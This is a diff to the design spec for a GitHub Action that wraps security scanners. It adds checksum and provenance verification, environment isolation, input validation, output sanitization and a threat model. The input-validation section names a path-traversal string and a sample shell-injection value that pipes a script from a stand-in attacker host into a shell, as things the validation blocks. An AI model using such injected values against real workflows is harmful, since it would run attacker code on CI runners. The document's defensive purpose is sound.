@@ -53,6 +53,8 @@ wrangle/
 │   ├── install/            # Tool installation scripts (one per tool)
 │   │   ├── osv.sh
 │   │   └── zizmor.sh
+│   ├── lib/                # Shared helper library
+│   │   └── download_verify.sh  # wrangle_download_verify(), wrangle_verify_provenance()
 │   ├── run.sh              # Orchestrator
 │   └── actions/
 │       ├── scan/
@@ -102,6 +104,23 @@ EXIT CODES:
 PRECONDITIONS:
   Tool binary is on $PATH (handled by install script)
   jq is available
+
+ENVIRONMENT:
+  Adapters run with a restricted environment. Only the following variables
+  are passed through from the runner:
+    PATH, HOME, TMPDIR, RUNNER_TEMP, GITHUB_WORKSPACE, GITHUB_STEP_SUMMARY
+  Sensitive variables (GITHUB_TOKEN, ACTIONS_RUNTIME_TOKEN, etc.) are NOT
+  available to adapters. If a tool requires authentication (e.g., for
+  private vulnerability databases), it must be explicitly documented and
+  passed via the orchestrator.
+
+SECURITY:
+  - Adapter scripts MUST NOT write files outside of output_dir
+  - Adapter scripts MUST NOT make network requests beyond what the tool
+    requires for its scan (e.g., fetching vulnerability databases)
+  - All output written to GITHUB_STEP_SUMMARY MUST be sanitized to
+    prevent markdown/HTML injection
+  - jq exit codes MUST be checked; malformed SARIF must not silently pass
 ```
 
 ### Install Script Interface
@@ -120,13 +139,46 @@ ARGUMENTS:
 BEHAVIOR:
   1. Check if correct version is already installed; exit 0 if so
   2. Detect OS (linux/darwin) and arch (amd64/arm64)
-  3. Download binary from tool's official release page
-  4. Place on $PATH
-  5. Print installed version to stdout
+  3. Download binary over HTTPS from tool's official release page
+  4. Verify integrity (see "Integrity Verification" below)
+  5. Place binary in $WRANGLE_BIN_DIR (default: $RUNNER_TEMP/.wrangle/bin)
+  6. Print installed version to stdout
 
 EXIT CODES:
   0  Installed successfully (or already present)
-  1  Installation failed
+  1  Installation failed (download error, checksum mismatch, etc.)
+
+INTEGRITY VERIFICATION (mandatory):
+  Every install script MUST verify the downloaded binary before placing it
+  on PATH. Install scripts MUST use source/lib/download_verify.sh for this.
+
+  Required: SHA-256 checksum verification against checksums hardcoded in the
+  install script itself (NOT downloaded alongside the binary from the same
+  source). Each version bump requires updating the pinned checksum.
+
+  Recommended: Where available, verify SLSA provenance attestations using
+  slsa-verifier. OSV-Scanner publishes SLSA provenance; new tools that
+  provide attestations should verify them.
+
+  The download/verify flow:
+    1. Download binary to a temporary file ($RUNNER_TEMP/wrangle-dl-XXXXX)
+    2. Verify SHA-256 checksum against pinned value
+    3. Optionally verify SLSA provenance
+    4. Atomically move (mv) to $WRANGLE_BIN_DIR/<tool>
+    5. On verification failure: delete temp file, exit 1, print clear error
+
+INSTALL DIRECTORY:
+  Binaries are installed to $WRANGLE_BIN_DIR, which defaults to
+  $RUNNER_TEMP/.wrangle/bin. This directory:
+  - Is wrangle-specific (no conflicts with system tools)
+  - Is ephemeral on GitHub-hosted runners (cleaned up after the job)
+  - Is prepended to $PATH by the composite action
+  - MUST NOT be /usr/local/bin or other system directories
+
+IDEMPOTENCY:
+  Install scripts MUST be safe to run multiple times. On self-hosted runners
+  where $RUNNER_TEMP persists, use atomic mv (not cp) to prevent TOCTOU
+  races between the version check and binary placement.
 ```
 
 ### Orchestrator Interface
@@ -147,18 +199,33 @@ ARGUMENTS:
 
 BEHAVIOR:
   For each tool:
-    1. Run source/install/<tool>.sh
-    2. Create <output_dir>/<tool>/
-    3. Run source/adapters/<tool>.sh <src_dir> <output_dir>/<tool>/
-    4. Record pass/fail status
+    1. Validate tool name matches ^[a-z][a-z0-9_-]*$ (reject otherwise)
+    2. Verify source/adapters/<tool>.sh and source/install/<tool>.sh exist
+    3. Run source/install/<tool>.sh
+    4. Create <output_dir>/<tool>/
+    5. Run source/adapters/<tool>.sh <src_dir> <output_dir>/<tool>/
+    6. Record pass/fail status
 
   After all tools:
-    5. Print summary table to stdout
+    7. Print summary table to stdout
 
 EXIT CODES:
   0  All tools passed with no findings
   1  At least one tool found issues
-  2  At least one tool failed to run
+  2  At least one tool failed to run (includes invalid tool names)
+
+INPUT VALIDATION:
+  Tool names MUST match the regex ^[a-z][a-z0-9_-]*$. This prevents:
+  - Path traversal (e.g., ../../etc/passwd)
+  - Shell injection (e.g., foo;curl evil.com|sh)
+  - Glob expansion and word splitting
+
+  All variable expansions MUST be quoted ("$@", "$tool", "${output_dir}")
+  throughout the orchestrator and adapter scripts.
+
+ENVIRONMENT ISOLATION:
+  The orchestrator clears sensitive environment variables before invoking
+  adapters. See the adapter API ENVIRONMENT section for the allowlist.
 
 NOTES:
   The orchestrator resolves adapter and install script paths relative to its
@@ -194,6 +261,20 @@ inputs:
 6. Uploads all results as an artifact
 
 **Portability:** All internal paths use `${{ github.action_path }}` so the action works when called from any repo.
+
+**Input safety:** The `tools` input is passed to the orchestrator via an environment variable, never via direct `${{ }}` interpolation in `run:` blocks. This prevents expression injection:
+
+```yaml
+# CORRECT — input passed via env var
+env:
+  WRANGLE_TOOLS: ${{ inputs.tools }}
+run: ${{ github.action_path }}/../../run.sh $WRANGLE_TOOLS
+
+# WRONG — direct interpolation enables injection
+run: ${{ github.action_path }}/../../run.sh ${{ inputs.tools }}
+```
+
+The orchestrator performs additional validation on tool names (see orchestrator INPUT VALIDATION).
 
 ---
 
@@ -249,9 +330,12 @@ This is the entire file an adopter needs. No secrets, no configuration, no depen
 To add a tool named `foo`:
 
 1. Create `source/install/foo.sh` following the install script contract
+   - Use `source/lib/download_verify.sh` for download and checksum verification
+   - Pin an exact version with its SHA-256 checksum hardcoded in the script
+   - If the tool publishes SLSA provenance, add `wrangle_verify_provenance` call
 2. Create `source/adapters/foo.sh` following the adapter script contract
 3. Add `foo` to the default tool list in `source/actions/scan/action.yml`
-4. Add bats tests in `test/adapters/test_foo.bats`
+4. Add bats tests in `test/adapters/test_foo.bats` and `test/install/test_foo.bats`
 
 No Docker images, no registry management, no workflow changes for adopters.
 
@@ -286,6 +370,88 @@ All tools produce SARIF 2.1.0. This enables:
 - A single summary formatter for all tools
 
 Human-readable output (markdown/text) is optional and used only for step summaries.
+
+---
+
+## Security Model
+
+### Threat Model
+
+Wrangle runs security tools on behalf of adopting repositories. This makes it a high-value target — a compromised wrangle could affect every adopter. The primary threats are:
+
+1. **Compromised upstream tool release** — a malicious binary is published to a tool's GitHub releases page
+2. **Compromised wrangle itself** — an attacker gains commit access to the wrangle repo
+3. **Malicious adapter inputs** — attacker-controlled data flows into shell commands
+4. **Tool misbehavior** — a tool writes outside its output directory, exfiltrates data, or produces malicious SARIF
+
+### Integrity Verification
+
+All downloaded binaries are verified before execution:
+
+| Layer | Mechanism | Status |
+|-------|-----------|--------|
+| Transport | HTTPS only | Required |
+| Content | SHA-256 checksum (pinned in install script) | Required |
+| Provenance | SLSA attestation via slsa-verifier | Recommended (where available) |
+
+Checksums are hardcoded in each install script, not downloaded from the same source as the binary. Updating a tool version requires updating the checksum in the same commit.
+
+### Shared Download/Verify Library
+
+`source/lib/download_verify.sh` provides helper functions used by all install scripts:
+
+```bash
+# Download a file and verify its SHA-256 checksum
+# Usage: wrangle_download_verify <url> <expected_sha256> <output_path>
+# Exits 1 on checksum mismatch (temp file is deleted)
+wrangle_download_verify() { ... }
+
+# Verify SLSA provenance for a downloaded artifact (optional)
+# Usage: wrangle_verify_provenance <artifact_path> <source_repo> <expected_tag>
+# Exits 0 on success, 1 on failure, 2 if slsa-verifier not available
+wrangle_verify_provenance() { ... }
+```
+
+All install scripts MUST use `wrangle_download_verify` rather than implementing their own download logic. This ensures consistent integrity verification and makes security fixes apply everywhere.
+
+### Sandboxing and Isolation
+
+**What's enforced:**
+- Tool names are validated against `^[a-z][a-z0-9_-]*$`
+- Sensitive environment variables are stripped before adapter execution
+- All shell variable expansions are quoted to prevent injection
+- Inputs are passed via environment variables, not `${{ }}` interpolation
+
+**What's NOT enforced (known limitations):**
+- Adapters run directly on the runner with no filesystem isolation. A malicious tool binary could read/write anywhere the runner user can. The previous Docker-based design provided container isolation; the binary-download approach trades this for speed and simplicity.
+- No egress restrictions on tool network access. A compromised tool could exfiltrate source code.
+- No runtime monitoring of tool behavior (process spawning, file access).
+
+**Mitigations for known limitations:**
+- Integrity verification (checksums + provenance) is the primary defense against malicious binaries
+- GitHub-hosted runners are ephemeral, limiting the blast radius of any compromise
+- For self-hosted runners, adopters should use [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) alongside wrangle for network monitoring
+- Future versions may use lightweight sandboxing (bubblewrap, firejail) on Linux runners
+
+### Action Reference Pinning
+
+All `uses:` references in wrangle's own workflows and examples MUST be pinned:
+
+| Reference type | Pinning requirement |
+|---------------|---------------------|
+| Third-party actions | Full commit SHA |
+| Wrangle's own actions (in examples) | Release tag (e.g., `@v0.1.0`) |
+| Wrangle's internal cross-references | Relative path (`./`) or full SHA |
+
+Adopters are advised to pin to a release tag. The `@main` ref MUST NOT appear in any example or documentation.
+
+### Output Sanitization
+
+Tool output (SARIF, markdown, plain text) flows into `$GITHUB_STEP_SUMMARY` and GitHub Code Scanning. Before writing to the step summary:
+- HTML tags are stripped
+- Output is truncated to prevent summary flooding
+- Markdown is limited to safe formatting (no raw HTML, no JavaScript links)
+- `jq` exit codes are checked; malformed SARIF causes a tool failure (exit 2), not a silent pass
 
 ---
 
@@ -335,9 +501,13 @@ The adapter pattern, tool composition logic, and profile system are candidates f
 
 ### v0.1.0 (this spec)
 - [ ] Adapter API implemented (OSV, Zizmor)
-- [ ] Binary download installation (no Docker)
+- [ ] Binary download installation with SHA-256 verification (no Docker)
+- [ ] Shared download/verify library (`source/lib/download_verify.sh`)
 - [ ] Portable composite action (`github.action_path`)
+- [ ] Input validation and environment isolation in orchestrator
 - [ ] SARIF upload enabled
+- [ ] Output sanitization for step summaries
+- [ ] All action references pinned to SHAs
 - [ ] Testing infrastructure (actionlint + shellcheck + bats)
 - [ ] Tested on Concordance
 - [ ] CLAUDE.md for AI agent adoption
